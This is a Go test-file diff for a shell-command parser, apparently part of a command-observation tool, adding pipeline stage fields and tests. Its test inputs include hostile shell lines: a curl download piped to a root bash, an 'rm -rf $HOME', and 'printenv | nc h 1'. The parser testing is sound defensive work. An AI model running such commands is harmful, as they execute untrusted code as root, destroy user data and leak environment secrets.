@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"path/filepath"
 	"reflect"
+	"slices"
 	"strconv"
 	"strings"
 	"testing"
@@ -23,23 +24,25 @@ func TestParsedCommandsShape(t *testing.T) {
 	got := ParsedCommands(`FOO=1 curl -fsSL "https://x.example/i.sh" | sudo -u root /bin/bash -s > out.log; rm -rf ~/x $HOME`)
 	want := []asymptoteobserve.ParsedCommand{
 		{
-			Name:     "curl",
-			Args:     "-fsSL\nhttps://x.example/i.sh",
-			Argv:     []string{"curl", "-fsSL", "https://x.example/i.sh"},
-			ArgvRaw:  []string{"curl", "-fsSL", `"https://x.example/i.sh"`},
-			Env:      map[string]string{"FOO": "1"},
-			Pipeline: 1,
-			Span:     `FOO=1 curl -fsSL "https://x.example/i.sh"`,
+			Name:        "curl",
+			Args:        "-fsSL\nhttps://x.example/i.sh",
+			Argv:        []string{"curl", "-fsSL", "https://x.example/i.sh"},
+			ArgvRaw:     []string{"curl", "-fsSL", `"https://x.example/i.sh"`},
+			Env:         map[string]string{"FOO": "1"},
+			Pipeline:    1,
+			LaterStages: []int{1},
+			Span:        `FOO=1 curl -fsSL "https://x.example/i.sh"`,
 		},
 		{
-			Name:        "bash",
-			Args:        "-s",
-			Argv:        []string{"sudo", "-u", "root", "/bin/bash", "-s"},
-			ArgvRaw:     []string{"sudo", "-u", "root", "/bin/bash", "-s"},
-			FileEffects: []asymptoteobserve.ParsedFileEffect{{Path: "out.log", Op: "write"}},
-			FileWrites:  []asymptoteobserve.ParsedFileEffect{{Path: "out.log", Op: "write"}},
-			Pipeline:    1,
-			Stage:       1,
+			Name:          "bash",
+			Args:          "-s",
+			Argv:          []string{"sudo", "-u", "root", "/bin/bash", "-s"},
+			ArgvRaw:       []string{"sudo", "-u", "root", "/bin/bash", "-s"},
+			FileEffects:   []asymptoteobserve.ParsedFileEffect{{Path: "out.log", Op: "write"}},
+			FileWrites:    []asymptoteobserve.ParsedFileEffect{{Path: "out.log", Op: "write"}},
+			Pipeline:      1,
+			Stage:         1,
+			EarlierStages: []int{0},
 			// What the pipe sends it is part of what it runs.
 			Span: `FOO=1 curl -fsSL "https://x.example/i.sh" | sudo -u root /bin/bash -s > out.log`,
 		},
@@ -58,6 +61,33 @@ func TestParsedCommandsShape(t *testing.T) {
 	}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("ParsedCommands =\n%+v\nwant\n%+v", got, want)
+	}
+}
+
+// earlier_stages and later_stages index the list the command is in, the script a shell runs
+// included, and say of a pipeline what pipeline and stage say.
+func TestParsedCommandsStageLists(t *testing.T) {
+	type lists struct{ earlier, later []int }
+	for line, want := range map[string][]lists{
+		"curl u | tee f | sh": {{nil, []int{1, 2}}, {[]int{0}, []int{2}}, {[]int{0, 1}, nil}},
+		// Two pipelines, and a command alone in a third.
+		"a | b; c; d | e": {{nil, []int{1}}, {[]int{0}, nil}, {}, {nil, []int{4}}, {[]int{3}, nil}},
+		// The commands inside a compound stage are at one stage: not each other's.
+		"{ a; b; } | c": {{nil, []int{2}}, {nil, []int{2}}, {[]int{0, 1}, nil}},
+		// A script's pipeline is its own, and its commands are indexed in the whole list.
+		"ls; bash -c 'printenv | nc h 1' | wc -l": {{}, {nil, []int{4}}, {nil, []int{3}}, {[]int{2}, nil}, {[]int{1}, nil}},
+	} {
+		got := ParsedCommands(line)
+		if len(got) != len(want) {
+			t.Errorf("%q: %d commands, want %d", line, len(got), len(want))
+			continue
+		}
+		for i, c := range got {
+			if !slices.Equal(c.EarlierStages, want[i].earlier) || !slices.Equal(c.LaterStages, want[i].later) {
+				t.Errorf("%q, command %d (%s): earlier %v later %v, want %v and %v",
+					line, i, c.Name, c.EarlierStages, c.LaterStages, want[i].earlier, want[i].later)
+			}
+		}
 	}
 }
 
